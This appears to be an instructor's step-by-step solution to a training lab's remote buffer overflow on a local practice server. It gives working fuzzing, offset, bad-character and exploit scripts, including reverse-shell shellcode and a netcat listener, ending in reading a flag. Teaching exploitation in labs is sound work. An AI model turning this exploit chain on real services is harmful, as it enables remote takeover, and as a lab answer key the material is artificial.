# Instructor Walkthrough: Lab 04 (OSCP-style Remote Buffer Overflow)

This document provides the exact, copy-pasteable scripts and commands required to solve the Lab 04 buffer overflow.

---

## 1. Fuzzer Script (`fuzzer.py`)
Run this to discover that the application crashes at around 600 bytes.

```python
#!/usr/bin/env python3
import socket
import time

target_ip = "127.0.0.1"
target_port = 9999

buffer = b"A" * 100

while len(buffer) <= 2000:
    try:
        print(f"[*] Fuzzing AUTH with {len(buffer)} bytes...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, target_port))
        s.recv(1024)
        s.send(b"AUTH " + buffer)
        
        response = s.recv(1024)
        if not response:
            print(f"[+] Fuzzing crashed at {len(buffer)} bytes! (No response)")
            break
            
        s.close()
        time.sleep(0.5)
        buffer += b"A" * 100
    except Exception as e:
        print(f"[+] Fuzzing crashed at {len(buffer)} bytes! (Exception)")
        break
```

---

## 2. Offset Discovery
Once the service crashes, you need to find the exact offset.

1. Generate a cyclic pattern:
```bash
msf-pattern_create -l 800
```
2. Send the pattern using a modified fuzzer or netcat.
3. Check the crash in GDB or the system logs to see what overwrote `RIP` (e.g., `0x3965413865413765`).
4. Find the offset:
```bash
msf-pattern_offset -q 0x3965413865413765
# Result: Exact match at offset 520
```

---

## 3. Bad Character Analysis Script (`badchars.py`)
Run this to send all possible characters and inspect memory to see which ones break the payload.

```python
#!/usr/bin/env python3
import socket

target_ip = "127.0.0.1"
target_port = 9999
offset = 520

# Generate all chars from \x01 to \xff
badchars = bytearray([x for x in range(1, 256)])

payload = b"AUTH " + (b"A" * offset) + b"BBBBCCCC" + badchars

print("[*] Sending bad character array...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
print("[+] Sent. Inspect memory in GDB to see where it truncates!")
```
*Note: Through analysis, you will discover the bad characters are: `\x00\x0a\x0d\x2b`.*

---

## 4. Gadget Hunting
Find the `JMP RSP` gadget to redirect execution.
```bash
objdump -d /srv/labs/lab04/bin/vault_server | grep -i 'jmp.*%rsp'
# Expected output: 40058a: ff e4  jmp *%rsp
```

---

## 5. Direct Solve Exploit (`exploit.py`)

1. Generate the shellcode:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x0a\x0d\x2b" -f python -v shellcode
```

2. Open a listener in a separate terminal:
```bash
nc -lvnp 4444
```

3. Create `exploit.py` (Paste your generated shellcode into the variable below):

```python
#!/usr/bin/env python3
import socket
import struct

target_ip = "127.0.0.1"
target_port = 9999
offset = 520

# Address of JMP RSP gadget (converted to little-endian)
jmp_rsp = struct.pack('<Q', 0x40058a) 

# =======================================================================
# PASTE MSFVENOM SHELLCODE HERE
# Command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00\x0a\x0d\x2b" -f python -v shellcode
# =======================================================================
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
shellcode += b"\x05\xef\xff\xff\xff\x48\xbb\xe0\x7d\x5e\x1d\xdc"
shellcode += b"\xb4\xc8\x2a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
shellcode += b"\xff\xe2\xf4\x8a\x54\x16\xf9\x92\xbf\x88\x2a\xe0"
shellcode += b"\x7d\x5e\x1d\x94\xf4\x98\x6f\xaa\x35\xd7\x71\xd8"
shellcode += b"\xba\x41\x4c\x8f\x35\x1e\x4b\xcd\xba\x81\x63\xa8"
shellcode += b"\x35\xdd\x6d\xc2\xba\x81\x63\xe8\x35\x85\x30\x94"
shellcode += b"\xfe\x93\x6e\xa9\x2c\xd6\x7c\x5b\xdc\xb4\xc8\x2a"
# =======================================================================

# NOP sled allows the CPU to "slide" into the decoded shellcode safely
nop_sled = b"\x90" * 32 

payload = b"AUTH " + (b"A" * offset) + jmp_rsp + nop_sled + shellcode

print(f"[*] Sending final exploit to {target_ip}:{target_port}...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close()
print("[+] Exploit fired! Check your netcat listener for the shell.")
```

4. Run the exploit script. Your listener will catch the shell as the `lab04` user.
5. Read the flag:
```bash
cat /etc/lab04_flag
```
